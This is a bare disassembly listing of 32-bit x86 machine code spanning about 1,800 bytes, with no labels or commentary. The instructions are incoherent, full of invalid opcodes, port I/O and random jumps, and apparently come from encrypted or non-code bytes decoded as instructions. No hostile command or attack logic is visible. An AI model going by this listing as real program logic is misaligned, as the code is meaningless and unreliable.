  41a4f1:	add    eax,0xaace0a46
  41a4f6:	(bad)  [ebx+0x771e762e]
  41a4fc:	retf   0xbe10
  41a4ff:	jg     0x41a54f
  41a501:	sub    BYTE PTR [esi],cl
  41a503:	xlat   BYTE PTR ds:[ebx]
  41a504:	stos   BYTE PTR es:[edi],al
  41a505:	nop
  41a506:	pushf  
  41a507:	sub    bl,BYTE PTR [edi-0x75da3e1e]
  41a50d:	dec    ecx
  41a50e:	inc    edx
  41a50f:	stc    
  41a510:	(bad)
  41a513:	mov    cl,al
  41a515:	stc    
  41a516:	sbb    eax,0x87de88d4
  41a51b:	fdivr  DWORD PTR [esi+0x50]
  41a51e:	jecxz  0x41a52f
  41a520:	mov    BYTE PTR [ebp-0x14],bh
  41a523:	dec    edi
  41a524:	cmp    esi,edx
  41a526:	mov    bh,0xb2
  41a528:	jle    0x41a52d
  41a52a:	xor    BYTE PTR [ebp+0x4],0xea
  41a52e:	inc    ebp
  41a52f:	jmp    0x41a556
  41a531:	ss pop ds
  41a533:	add    eax,0x44fcfa81
  41a538:	pop    edx
  41a539:	cmc    
  41a53a:	(bad)  
  41a53b:	aad    0x73
  41a53d:	ja     0x41a4ca
  41a53f:	cmove  edi,DWORD PTR [edx]
  41a542:	jg     0x41a4f7
  41a544:	mov    BYTE PTR [edi+0x183f96d2],bl
  41a54a:	ss pop edx
  41a54c:	outs   dx,BYTE PTR ds:[esi]
  41a54d:	adc    eax,0xf87dbfd8
  41a552:	out    dx,al
  41a553:	xor    al,0x62
  41a555:	cmp    ah,BYTE PTR [edx]
  41a557:	inc    esp
  41a558:	mov    BYTE PTR [ebx],ah
  41a55a:	sub    al,BYTE PTR [ebx-0x44660204]
  41a560:	cmp    BYTE PTR ds:0x2d2bbc52,bl
  41a566:	dec    eax
  41a567:	mov    bh,0xe8
  41a569:	ins    BYTE PTR es:[edi],dx
  41a56a:	icebp  
  41a56b:	out    dx,eax
  41a56c:	mov    ebx,esi
  41a56e:	add    cl,BYTE PTR ds:0x2b21b1c3
  41a574:	jge    0x41a576
  41a576:	mov    al,ds:0xed5c3a4a
  41a57b:	pop    ds
  41a57c:	mov    ebp,0xf2fadf86
  41a581:	xchg   ebp,eax
  41a582:	push   edi
  41a583:	or     eax,0x599ecf89
  41a588:	ja     0x41a603
  41a58a:	shl    BYTE PTR [ebx],0x88
  41a58d:	add    ebp,DWORD PTR [eax]
  41a58f:	xor    ebp,DWORD PTR ds:0x968d0c3e
  41a595:	(bad)
  41a59a:	iret   
  41a59b:	inc    edx
  41a59c:	add    ch,dh
  41a59e:	xor    BYTE PTR [ebp-0x77],0xf9
  41a5a2:	adc    BYTE PTR [edi+eax*1+0x2f],bh
  41a5a6:	test   DWORD PTR [ebx+0x7f],esp
  41a5a9:	add    ecx,DWORD PTR [eax]
  41a5ab:	mov    al,0x6e
  41a5ae:	int    0xb8
  41a5b0:	xor    eax,0x56191f0f
  41a5b5:	test   al,0x5f
  41a5b7:	mov    esi,0xd4060b48
  41a5bc:	or     al,0xa2
  41a5be:	popa   
  41a5bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5c0:	ficom  WORD PTR [ebp+0xd4913d1]
  41a5c6:	pop    ds
  41a5c7:	xchg   ecx,eax
  41a5c8:	dec    al
  41a5ca:	pop    esi
  41a5cb:	mov    eax,0x9ffcc6c2
  41a5d0:	sub    DWORD PTR cs:[eax],0x4fcd811f
  41a5d7:	ins    BYTE PTR es:[edi],dx
  41a5d8:	rol    DWORD PTR [edx],cl
  41a5da:	test   BYTE PTR [eax+edx*1],0xfc
  41a5de:	or     DWORD PTR [ecx-0x78],edi
  41a5e1:	sar    DWORD PTR [edx-0x24],1
  41a5e4:	sub    DWORD PTR [edi-0x79],edx
  41a5e7:	pusha  
  41a5e8:	inc    eax
  41a5e9:	jb     0x41a5b5
  41a5eb:	push   ecx
  41a5ec:	mov    BYTE PTR [ecx-0x2f],ch
  41a5ef:	push   edi
  41a5f0:	rcl    DWORD PTR es:[ebx-0x14],cl
  41a5f4:	mov    ch,dl
  41a5f6:	push   cs
  41a5f7:	je     0x41a618
  41a5f9:	pushf  
  41a5fa:	ins    BYTE PTR es:[edi],dx
  41a5fb:	scas   eax,DWORD PTR es:[edi]
  41a5fc:	int3   
  41a5fd:	icebp  
  41a5fe:	jge    0x41a5b1
  41a600:	rcl    BYTE PTR [esi-0x13ed47ae],cl
  41a606:	pusha  
  41a607:	xchg   ebx,eax
  41a608:	les    edi,FWORD PTR [ecx]
  41a60a:	je     0x41a5e3
  41a60c:	mov    DWORD PTR [edi],edx
  41a60e:	mov    ecx,0xd363735
  41a613:	push   ecx
  41a614:	sbb    DWORD PTR [eax],eax
  41a616:	dec    esi
  41a617:	add    bh,BYTE PTR [ebp+0x47]
  41a61a:	(bad)  
  41a61b:	fld    QWORD PTR [ecx]
  41a61d:	mov    edx,0xbd88726c
  41a622:	jo     0x41a5ac
  41a624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a625:	repnz push esp
  41a627:	jbe    0x41a67d
  41a629:	add    ah,dh
  41a62b:	outs   dx,BYTE PTR ds:[esi]
  41a62c:	mov    edx,0xbe32628b
  41a631:	enter  0x1f1f,0x1f
  41a635:	fsubrp st(0),st
  41a637:	dec    ecx
  41a638:	or     al,0xc3
  41a63a:	cmp    al,0xd4
  41a63c:	mov    gs,WORD PTR [eax-0x1e62fb86]
  41a642:	test   eax,0xd341933
  41a647:	fimul  DWORD PTR [eax+0x1675ec09]
  41a64d:	push   esi
  41a64e:	jge    0x41a677
  41a650:	lahf   
  41a651:	add    eax,0xf15052
  41a656:	ror    DWORD PTR [esi-0x23],cl
  41a659:	shl    BYTE PTR [edx+0x1b],cl
  41a65c:	xchg   ebx,eax
  41a65d:	jne    0x41a619
  41a65f:	mov    ch,0xd7
  41a661:	test   DWORD PTR [eax],edx
  41a663:	dec    ebx
  41a664:	xor    BYTE PTR [edx],al
  41a666:	dec    edx
  41a667:	dec    ebx
  41a668:	or     esi,ebx
  41a66a:	mov    eax,0x9286024f
  41a66f:	imul   ebx,ebx,0x6ae6de05
  41a675:	fcomi  st,st(5)
  41a677:	pop    esp
  41a678:	je     0x41a67c
  41a67a:	inc    eax
  41a67b:	xchg   DWORD PTR [esi+0x6f],eax
  41a67e:	push   eax
  41a67f:	dec    eax
  41a680:	pop    ebp
  41a681:	dec    ebx
  41a682:	jge    0x41a6c1
  41a684:	xchg   esi,eax
  41a685:	push   ss
  41a686:	push   ebx
  41a687:	pop    ebx
  41a688:	mov    bl,0x3d
  41a68a:	(bad)  [ecx+0x7be1078f]
  41a690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a691:	cmc    
  41a692:	cwde   
  41a693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a694:	jp     0x41a6aa
  41a696:	(bad)  
  41a697:	(bad)  
  41a698:	pusha  
  41a699:	std    
  41a69a:	sub    eax,0x89cc28d1
  41a69f:	sub    eax,0x871e5da9
  41a6a4:	push   edi
  41a6a5:	es mov eax,0xd746dadd
  41a6ab:	aam    0xd4
  41a6ad:	mov    edi,0xc9836f01
  41a6b2:	das    
  41a6b3:	hlt    
  41a6b4:	xchg   esi,eax
  41a6b5:	ins    DWORD PTR es:[edi],dx
  41a6b6:	fld    QWORD PTR [esi+eax*4-0x45e145fb]
  41a6bd:	sbb    eax,0xa85ad6d3
  41a6c2:	mov    eax,ds:0x2afc7c8d
  41a6c7:	daa    
  41a6c8:	cmp    dh,BYTE PTR [ebx+0x1f]
  41a6cb:	cmp    esi,0x21
  41a6ce:	dec    esp
  41a6cf:	mov    bh,0xf0
  41a6d1:	in     al,dx
  41a6d2:	data16 mov dl,ch
  41a6d5:	or     eax,0x313b2c3
  41a6da:	cmp    al,0x7e
  41a6dc:	or     al,0x85
  41a6de:	push   ss
  41a6df:	(bad)  
  41a6e0:	pop    DWORD PTR [ecx]
  41a6e2:	xor    BYTE PTR [eax+0x17272276],0x98
  41a6e9:	sbb    ah,ch
  41a6eb:	aam    0x56
  41a6ed:	std    
  41a6ee:	jno    0x41a712
  41a6f0:	retf   0x37cd
  41a6f3:	data16 outs dx,BYTE PTR ds:[esi]
  41a6f5:	sbb    bl,BYTE PTR [esi]
  41a6f7:	xchg   ecx,edi
  41a6f9:	jmp    0x41a702
  41a6fb:	mov    esp,0xd55cc714
  41a700:	je     0x41a735
  41a702:	lahf   
  41a703:	loop   0x41a6c7
  41a705:	adc    edi,DWORD PTR [edx]
  41a707:	inc    esi
  41a708:	mov    DWORD PTR [ecx],esi
  41a70a:	mov    ah,0x52
  41a70c:	mov    ds:0xecab2097,eax
  41a711:	add    eax,0x4adddf30
  41a716:	jmp    0x761d:0x1f959adf
  41a71d:	shr    DWORD PTR [ebp+0x22],cl
  41a720:	stc    
  41a721:	scas   al,BYTE PTR es:[edi]
  41a722:	dec    ebp
  41a723:	pop    edi
  41a724:	pop    ds
  41a725:	les    esp,FWORD PTR [eax+0x47]
  41a728:	add    dl,BYTE PTR [esi+0x4e77c13b]
  41a72e:	push   ds
  41a72f:	lods   eax,DWORD PTR ds:[esi]
  41a730:	and    eax,0xf867de13
  41a735:	push   cs
  41a736:	fisubr DWORD PTR [edx+0x10acbf00]
  41a73c:	add    edi,DWORD PTR [edx+edx*2+0x779d880c]
  41a743:	cwde   
  41a744:	pop    ecx
  41a745:	jg     0x41a6d1
  41a747:	or     BYTE PTR [ecx],ch
  41a749:	add    esp,eax
  41a74b:	mov    ss,edi
  41a74d:	gs adc eax,0xf17e57b
  41a753:	imul   eax,esp,0xb
  41a756:	enter  0x86e9,0x41
  41a75a:	ss pop esp
  41a75c:	sub    BYTE PTR [eax-0x12],cl
  41a75f:	test   bl,ch
  41a761:	add    ch,BYTE PTR [edx+0x16]
  41a764:	sub    BYTE PTR [ebx],cl
  41a766:	xchg   BYTE PTR [edx-0x3aa26154],bl
  41a76c:	mov    bh,BYTE PTR [ebp-0x62604b9f]
  41a772:	pop    esp
  41a773:	xchg   esi,eax
  41a774:	sub    al,0xc3
  41a776:	xchg   ebx,eax
  41a777:	je     0x41a72a
  41a779:	add    cl,BYTE PTR [eax+0x2b]
  41a77c:	push   ecx
  41a77d:	sub    DWORD PTR [esi],ebp
  41a77f:	xchg   esp,eax
  41a780:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41a782:	add    cl,BYTE PTR [edx-0x34396278]
  41a788:	leave  
  41a789:	lahf   
  41a78a:	sub    bl,ah
  41a78c:	pushf  
  41a78d:	push   0xffffff94
  41a78f:	mov    esp,ebp
  41a791:	add    eax,0xb5254cce
  41a796:	cs test eax,0x8f409bd9
  41a79c:	icebp  
  41a79d:	fistp  DWORD PTR [esi-0x2a]
  41a7a0:	pop    ebp
  41a7a1:	push   0xbef81975
  41a7a6:	das    
  41a7a7:	sbb    DWORD PTR [ecx-0x886b7fe],eax
  41a7ad:	push   ss
  41a7ae:	xor    al,0xf7
  41a7b0:	popa   
  41a7b1:	into   
  41a7b2:	pop    ds
  41a7b3:	mov    ds:0xceccd7e,eax
  41a7b8:	imul   ebx,DWORD PTR [ebp-0xf28d8f8],0x6a96d760
  41a7c2:	nop
  41a7c3:	mov    esi,0x131fb887
  41a7c8:	cmp    esi,ebx
  41a7ca:	(bad)  
  41a7cb:	std    
  41a7cc:	(bad)  
  41a7cd:	mov    edi,0xf203ab98
  41a7d2:	adc    bh,BYTE PTR [esi]
  41a7d4:	cmp    al,BYTE PTR [edx+0x57]
  41a7d7:	test   ah,ch
  41a7d9:	sub    DWORD PTR [esi+0x7b],0xd69906b4
  41a7e0:	leave  
  41a7e1:	(bad)  
  41a7e2:	adc    al,0xc6
  41a7e4:	loop   0x41a7e8
  41a7e6:	and    BYTE PTR [edx+0x63],dl
  41a7e9:	js     0x41a853
  41a7eb:	push   es
  41a7ec:	fist   DWORD PTR [ebp+0x68]
  41a7ef:	imul   edx,edx,0xffffffa0
  41a7f2:	rcl    DWORD PTR [edi-0x78],cl
  41a7f5:	adc    ah,BYTE PTR [ecx+0x7802fd5a]
  41a7fb:	dec    ecx
  41a7fc:	xchg   edx,eax
  41a7fd:	mov    ah,0x0
  41a7ff:	fwait
  41a800:	mov    cl,0x29
  41a802:	pop    ds
  41a803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a804:	push   cs
  41a805:	adc    eax,DWORD PTR [esi]
  41a807:	xchg   edi,eax
  41a808:	cs jnp 0x41a83a
  41a80b:	xlat   BYTE PTR ds:[ebx]
  41a80c:	dec    edi
  41a80d:	(bad)  
  41a80e:	sbb    eax,esp
  41a810:	test   DWORD PTR [edi],edi
  41a812:	mov    gs,WORD PTR [eax+ecx*4]
  41a815:	mov    edx,ebx
  41a817:	vpaddsb ymm6,ymm2,ymm1
  41a81b:	aad    0xc5
  41a81d:	add    eax,0x6b3f4fc
  41a822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a823:	pushf  
  41a824:	loope  0x41a810
  41a826:	adc    eax,0x3c8788ae
  41a82b:	fistp  DWORD PTR [ebp+edx*8+0x5e38521]
  41a832:	fcom   DWORD PTR [ebp-0x5b]
  41a835:	(bad)  
  41a836:	pop    edx
  41a837:	cmc    
  41a838:	cwde   
  41a839:	and    DWORD PTR [edx-0x7f],eax
  41a83c:	clc    
  41a83d:	adc    BYTE PTR [edx-0x47],bh
  41a840:	jle    0x41a883
  41a842:	not    BYTE PTR [eax+0x3d]
  41a845:	pslld  mm1,mm0
  41a848:	adc    BYTE PTR [ebx-0x24],bl
  41a84b:	aad    0x4a
  41a84d:	cmp    DWORD PTR [esp+edx*1],0x905b0714
  41a854:	adc    DWORD PTR [edi],0xffffffcf
  41a857:	ds xchg ebp,eax
  41a859:	daa    
  41a85a:	push   ds
  41a85b:	ins    BYTE PTR es:[edi],dx
  41a85c:	xchg   esp,eax
  41a85d:	and    bh,bl
  41a85f:	aad    0x4d
  41a861:	dec    eax
  41a862:	mov    bl,0x78
  41a864:	in     al,dx
  41a865:	shr    BYTE PTR [ecx],cl
  41a867:	xor    al,0x89
  41a869:	mov    cl,0x9
  41a86b:	pop    eax
  41a86c:	repnz lods al,BYTE PTR ds:[esi]
  41a86e:	in     al,dx
  41a86f:	pop    edx
  41a870:	mov    es,WORD PTR ds:0x150667b6
  41a876:	jno    0x41a871
  41a878:	fs aas 
  41a87a:	push   ds
  41a87b:	xor    eax,0xaa96405
  41a880:	push   esp
  41a881:	cli    
  41a882:	dec    edx
  41a883:	aad    0x73
  41a885:	add    eax,0xc07ee30e
  41a88a:	mov    esp,0xe1c58849
  41a88f:	lea    esi,[edi]
  41a891:	fwait
  41a892:	popa   
  41a893:	mov    al,ds:0x6f780283
  41a898:	lahf   
  41a899:	daa    
  41a89a:	mov    ah,0xe2
  41a89c:	in     al,dx
  41a89d:	inc    esp
  41a89e:	pop    ds
  41a89f:	cmp    edi,esp
  41a8a1:	inc    eax
  41a8a2:	inc    esp
  41a8a3:	aam    0xf8
  41a8a5:	ins    BYTE PTR es:[edi],dx
  41a8a6:	and    bh,dl
  41a8a8:	pop    eax
  41a8a9:	cli    
  41a8aa:	rol    DWORD PTR [esi-0x5a6f1829],cl
  41a8b0:	sbb    BYTE PTR [eax+0x67ed4c9],ch
  41a8b6:	dec    esp
  41a8b7:	jo     0x41a906
  41a8b9:	pushf  
  41a8ba:	sub    eax,0x7602b5f2
  41a8bf:	adc    bh,BYTE PTR [ebx-0x19]
  41a8c2:	nop
  41a8c3:	into   
  41a8c4:	dec    ebx
  41a8c5:	mov    DWORD PTR [ebx],eax
  41a8c7:	mov    dl,0x9f
  41a8c9:	inc    ebp
  41a8ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8cb:	inc    esp
  41a8cc:	dec    ecx
  41a8cd:	add    esi,DWORD PTR [edx+0x1ee5604c]
  41a8d3:	mov    eax,0x6f942e61
  41a8d8:	mov    DWORD PTR [edx+0x3866690],eax
  41a8de:	popa   
  41a8df:	mov    cl,0x32
  41a8e1:	jmp    0xe7abac0
  41a8e6:	aaa    
  41a8e7:	mov    eax,ds:0xf77ee1bd
  41a8ec:	pop    edx
  41a8ed:	daa    
  41a8ee:	inc    edx
  41a8ef:	retf   0x7678
  41a8f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8f3:	xor    esp,DWORD PTR [esi]
  41a8f5:	add    ebx,DWORD PTR [ecx-0x64]
  41a8f8:	inc    esi
  41a8f9:	inc    edi
  41a8fa:	pop    ds
  41a8fb:	add    eax,0x2f09f9eb
  41a900:	dec    esp
  41a901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a902:	in     eax,dx
  41a903:	aam    0x7d
  41a905:	mov    DWORD PTR [edx+0x3bdf32fe],ecx
  41a90b:	jp     0x41a987
  41a90d:	popw   ds
  41a90f:	push   ebp
  41a910:	je     0x41a8e1
  41a912:	loopne 0x41a8cb
  41a914:	cmp    al,0x32
  41a916:	mov    ch,0xd4
  41a918:	out    dx,al
  41a919:	push   ebp
  41a91a:	push   0xffffffca
  41a91c:	and    ebp,DWORD PTR [ecx-0x467c3bf5]
  41a922:	das    
  41a923:	popa   
  41a924:	pop    esi
  41a925:	sub    eax,0x1f11fa1e
  41a92a:	fild   WORD PTR [ebx+0x50]
  41a92d:	mov    bl,BYTE PTR [edi]
  41a92f:	sbb    eax,0xe294c91b
  41a934:	pop    ecx
  41a935:	(bad)  [eax-0x5]
  41a938:	popf   
  41a939:	pop    ebx
  41a93a:	push   ebp
  41a93b:	bound  edx,QWORD PTR [bx+di+0x41]
  41a93f:	aam    0xf1
  41a941:	dec    ebx
  41a942:	jbe    0x41a942
  41a944:	pop    DWORD PTR [esi]
  41a946:	sti    
  41a947:	cmp    al,ch
  41a949:	rol    DWORD PTR [eax+0x34],0x9a
  41a94d:	addr16 pop edi
  41a94f:	stos   BYTE PTR es:[edi],al
  41a950:	cdq    
  41a951:	sbb    cl,bh
  41a953:	test   al,0x30
  41a955:	(bad)  
  41a956:	int    0xb4
  41a958:	xchg   ebx,eax
  41a959:	bound  ebx,QWORD PTR [esi]
  41a95b:	pop    ebp
  41a95c:	add    BYTE PTR [esi+ebx*2+0x11],ch
  41a960:	push   ss
  41a961:	idiv   DWORD PTR [ebp-0x7fcae33]
  41a967:	(bad)  
  41a968:	cs mov ah,0x3c
  41a96b:	dec    edi
  41a96c:	dec    edx
  41a96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a96e:	pop    ebp
  41a96f:	sar    DWORD PTR [ecx+ecx*2],cl
  41a972:	in     al,0xf2
  41a974:	aad    0x6a
  41a976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a977:	aad    0x30
  41a979:	test   al,0xee
  41a97b:	lahf   
  41a97c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a97d:	mov    ebx,0x2a45d5eb
  41a982:	lock mov eax,0xcb1e5986
  41a988:	cmc    
  41a989:	popa   
  41a98a:	mov    ds:0xcbc5cd5,eax
  41a98f:	xlat   BYTE PTR ds:[ebx]
  41a990:	pop    ebx
  41a991:	jb     0x41a9e2
  41a993:	shl    DWORD PTR ds:0x8ef774f3,cl
  41a999:	fisttp QWORD PTR [ecx]
  41a99b:	jb     0x41a9d3
  41a99d:	push   0xffffffad
  41a99f:	xor    eax,0xd279bde2
  41a9a4:	xor    ecx,DWORD PTR [esi]
  41a9a6:	sub    DWORD PTR [edi+0x56],edi
  41a9a9:	or     ebx,DWORD PTR ds:0xef1f2cd7
  41a9af:	loope  0x41a93a
  41a9b1:	arpl   WORD PTR [ebx+0x5e3808fc],di
  41a9b7:	mov    ecx,0x230617b7
  41a9bc:	(bad)  
  41a9be:	xor    BYTE PTR [edi+0x4d3c44c],dh
  41a9c4:	xchg   edi,eax
  41a9c5:	(bad)  
  41a9c6:	dec    eax
  41a9c7:	push   es
  41a9c8:	in     al,0x93
  41a9ca:	sub    esp,edx
  41a9cc:	mov    ds:0x9b74a6b6,al
  41a9d1:	add    bl,dl
  41a9d3:	fmul   QWORD PTR [ecx+0x74]
  41a9d6:	xchg   esp,eax
  41a9d7:	or     DWORD PTR [esi+eax*4-0x25bc2ee1],eax
  41a9de:	add    eax,0xbd028e33
  41a9e3:	sar    BYTE PTR [ebp+ebx*2+0x234064f2],cl
  41a9ea:	cs mov edi,0x931f1b46
  41a9f0:	jmp    0x41a9ad
  41a9f2:	fstp   TBYTE PTR [ecx]
  41a9f4:	mov    edx,0x24d4b243
  41a9f9:	stos   BYTE PTR es:[edi],al
  41a9fa:	push   ss
  41a9fb:	leave  
  41a9fc:	loop   0x41aa69
  41a9fe:	pop    esi
  41a9ff:	and    DWORD PTR [ecx-0x7a432cf],0x4abc6a02
  41aa09:	dec    BYTE PTR [esp-0x23d3a560]
  41aa10:	fiadd  WORD PTR ds:0xa22b04b6
  41aa16:	pmaddwd mm1,QWORD PTR [edx-0x25cf8a63]
  41aa1d:	pop    ss
  41aa1e:	add    ecx,DWORD PTR [ecx+0x48]
  41aa21:	pushf  
  41aa22:	fst    st(4)
  41aa24:	push   0x12cf7e14
  41aa29:	inc    esi
  41aa2a:	pop    ebp
  41aa2b:	xchg   ebp,eax
  41aa2c:	mov    BYTE PTR [ebx+0x551105be],al
  41aa32:	add    edi,DWORD PTR [eax]
  41aa34:	pop    DWORD PTR [eax]
  41aa36:	rcr    BYTE PTR [edi],cl
  41aa38:	inc    ecx
  41aa39:	mov    bl,0xb3
  41aa3b:	pop    edi
  41aa3c:	and    eax,0x89470cb3
  41aa41:	mov    bl,0x66
  41aa43:	jmp    0x49dda9b5
  41aa48:	add    al,BYTE PTR [ebx]
  41aa4a:	in     al,0xed
  41aa4c:	loope  0x41aa6c
  41aa4e:	fwait
  41aa4f:	inc    esi
  41aa50:	in     eax,0x4e
  41aa52:	push   ds
  41aa53:	xor    eax,0x6e987852
  41aa58:	adc    al,0x6
  41aa5a:	aad    0xb9
  41aa5c:	retf   0x3ff2
  41aa5f:	scas   al,BYTE PTR es:[edi]
  41aa60:	or     ebx,edx
  41aa62:	fstp   DWORD PTR [ebp-0x79]
  41aa65:	inc    edi
  41aa66:	pop    ds
  41aa67:	dec    edi
  41aa68:	pop    ecx
  41aa69:	and    ebp,DWORD PTR gs:[ecx-0x70]
  41aa6d:	add    DWORD PTR [esp+edx*8-0x79bad25c],eax
  41aa74:	cmp    DWORD PTR [ecx+0x23881315],0x6b
  41aa7b:	jmp    0xc05d5f40
  41aa80:	mov    ds:0xa96a9a05,al
  41aa85:	dec    ebx
  41aa86:	add    bh,dh
  41aa88:	shr    BYTE PTR [ebp+ebp*2-0x27],cl
  41aa8c:	cmp    DWORD PTR [ebx-0x44],edx
  41aa8f:	cmp    BYTE PTR [eax+0x3f],ch
  41aa92:	push   0x80020085
  41aa97:	dec    esp
  41aa98:	pop    edi
  41aa99:	mov    bh,0x1d
  41aa9b:	ins    BYTE PTR es:[edi],dx
  41aa9c:	or     DWORD PTR [edx],ebx
  41aa9e:	pusha  
  41aa9f:	ret    
  41aaa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaa1:	sub    BYTE PTR [edi-0x68],cl
  41aaa4:	das    
  41aaa5:	test   DWORD PTR [edi],edi
  41aaa7:	std    
  41aaa8:	jbe    0x41aaab
  41aaaa:	ss arpl si,bp
  41aaad:	js     0x41aab1
  41aaaf:	push   ebx
  41aab0:	push   ss
  41aab1:	rcl    DWORD PTR [ebp+0x3c],0x8d
  41aab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aab6:	pusha  
  41aab7:	test   eax,eax
  41aab9:	mov    ds:0x9c0c5d0a,eax
  41aabe:	outs   dx,DWORD PTR ds:[esi]
  41aabf:	aad    0x33
  41aac1:	out    0x8e,al
  41aac3:	call   0xd2d01676
  41aac8:	dec    ebp
  41aac9:	nop    eax
  41aacc:	mov    ch,0x9b
  41aace:	loop   0x41ab3d
  41aad0:	adc    eax,0x67555715
  41aad5:	out    dx,eax
  41aad6:	mov    esi,0xd60313eb
  41aadb:	fsubr  DWORD PTR [edx+0x27356fda]
  41aae1:	push   ecx
  41aae2:	xchg   esi,eax
  41aae3:	pop    ebx
  41aae4:	dec    esp
  41aae5:	add    edx,esi
  41aae7:	mov    ebp,0x32e36981
  41aaec:	icebp  
  41aaed:	add    eax,0xab8b5794
  41aaf2:	sbb    dh,ah
  41aaf4:	ror    BYTE PTR [ecx-0x24cce9f],1
  41aafa:	sub    al,0x6b
  41aafc:	out    0xa0,eax
  41aafe:	add    dh,BYTE PTR [edi]
  41ab00:	push   0xd9a50c73
  41ab05:	mov    al,0x93
  41ab07:	(bad)  [ebx+0x54]
  41ab0a:	and    dl,BYTE PTR [ecx-0x17]
  41ab0d:	lock div ebp
  41ab10:	jbe    0x41ab80
  41ab12:	pop    ebx
  41ab13:	jmp    edx
  41ab15:	xchg   edx,eax
  41ab16:	loopne 0x41aac1
  41ab18:	fxam   
  41ab1a:	int3   
  41ab1b:	xor    BYTE PTR [ebx-0x312e9dec],bh
  41ab21:	mov    WORD PTR [ecx],ds
  41ab23:	aam    0xd9
  41ab25:	hlt    
  41ab26:	inc    edx
  41ab27:	mov    eax,0xcf489989
  41ab2c:	dec    ecx
  41ab2d:	push   es
  41ab2e:	iret   
  41ab2f:	stos   BYTE PTR es:[edi],al
  41ab30:	jmp    0x41ab34
  41ab32:	and    BYTE PTR [edx-0x35],dh
  41ab35:	push   edi
  41ab36:	ja     0x41ab19
  41ab38:	sub    bh,BYTE PTR [edx-0x660ea09b]
  41ab3e:	dec    ebp
  41ab3f:	push   eax
  41ab40:	add    ah,dl
  41ab42:	loop   0x41ab2c
  41ab44:	xlat   BYTE PTR ds:[ebx]
  41ab45:	and    al,0x26
  41ab47:	daa    
  41ab48:	sub    BYTE PTR [esi+ebx*4],ch
  41ab4b:	mov    dl,0x55
  41ab4d:	inc    eax
  41ab4e:	dec    eax
  41ab4f:	imul   ecx,DWORD PTR [esi-0x4d1b69f7],0xb16166d1
  41ab59:	(bad)
  41ab5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab5d:	add    eax,0xf3083144
  41ab62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab63:	add    eax,DWORD PTR [eax+0x592f60bd]
  41ab69:	imul   BYTE PTR [edx-0x76374216]
  41ab6f:	js     0x41abe1
  41ab71:	aaa    
  41ab72:	adc    ebp,0xa237b2f5
  41ab78:	dec    edi
  41ab79:	out    0x60,al
  41ab7b:	aaa    
  41ab7c:	sbb    BYTE PTR [eax],dl
  41ab7e:	pushf  
  41ab7f:	xchg   ebx,eax
  41ab80:	inc    esi
  41ab81:	add    ah,BYTE PTR [ebp-0x55]
  41ab84:	lods   al,BYTE PTR ds:[esi]
  41ab85:	in     eax,dx
  41ab86:	enter  0xee3a,0xc2
  41ab8a:	mov    cl,0x77
  41ab8c:	sub    al,0x74
  41ab8e:	scas   eax,DWORD PTR es:[edi]
  41ab8f:	sub    DWORD PTR [eax-0x13],esi
  41ab92:	pusha  
  41ab93:	lds    ebp,FWORD PTR [ecx]
  41ab95:	add    al,0xe4
  41ab97:	and    eax,0xd5987688
  41ab9c:	iret   
  41ab9d:	dec    esp
  41ab9e:	mov    ecx,0x40af44d0
  41aba3:	and    eax,0xb2d59388
  41aba8:	das    
  41aba9:	sub    al,0xf6
  41abab:	scas   eax,DWORD PTR es:[edi]
  41abac:	xor    eax,0x14d9aee3
  41abb1:	add    edx,DWORD PTR [edx+0x4edb776c]
  41abb7:	aam    0x6f
  41abb9:	cmp    al,0x2
  41abbb:	in     eax,dx
  41abbc:	ds call 0x30f3462
  41abc2:	es cld 
  41abc4:	rol    edx,1
  41abc6:	cmp    ecx,DWORD PTR [edi+ecx*4]
  41abc9:	dec    ebp
  41abca:	jnp    0x41ab65
  41abcc:	test   bl,0x86
  41abcf:	adc    eax,0x5ec30782
  41abd4:	jo     0x41abd7
  41abd6:	sbb    BYTE PTR [edi+0x2234bae8],bl
  41abdc:	lds    eax,FWORD PTR ss:[eax-0x34]
  41abe0:	jecxz  0x41ab8c
  41abe2:	jge    0x41ac07
  41abe4:	jge    0x41ac1f
  41abe6:	outs   dx,DWORD PTR ds:[esi]
  41abe7:	adc    eax,0x1e77de3c
  41abec:	test   eax,0xf2dc2005
  41abf1:	adc    al,0xe8
  41abf3:	dec    edi
  41abf4:	sub    dl,BYTE PTR [ecx-0x61aa1484]
  41abfa:	inc    esp
  41abfb:	xchg   esp,eax
  41abfc:	stc    
  41abfd:	mov    es,WORD PTR [eax+0x1a241a9a]
  41ac03:	xchg   edx,eax
  41ac04:	shl    BYTE PTR [edi],0x5b
  41ac07:	push   ebp
  41ac08:	das    
  41ac09:	inc    ecx
  41ac0a:	and    ebx,DWORD PTR [ebp+0x51]
  41ac0d:	mov    ah,0x14
  41ac0f:	inc    eax
  41ac10:	mov    ebp,ecx
  41ac12:	pushf  
  41ac13:	push   edx
  41ac14:	repnz sbb al,0xfc
  41ac17:	and    dh,BYTE PTR [edx-0x3c9885fb]
  41ac1d:	shl    BYTE PTR [esi-0x6e],1
  41ac20:	retf   0x60b0
  41ac23:	rep stos DWORD PTR es:[edi],eax
  41ac25:	(bad)  [edi]
  41ac27:	inc    ecx
  41ac28:	aam    0x5d
  41ac2a:	xor    al,0xd1
  41ac2c:	adc    DWORD PTR [eax],eax
  41ac2e:	outs   dx,DWORD PTR ds:[esi]
  41ac2f:	add    al,0xbc
  41ac31:	sti    
  41ac32:	jb     0x41abc8
  41ac34:	dec    edx
  41ac35:	add    ebx,DWORD PTR [edi]
  41ac37:	addr16 jne 0x41ac1f
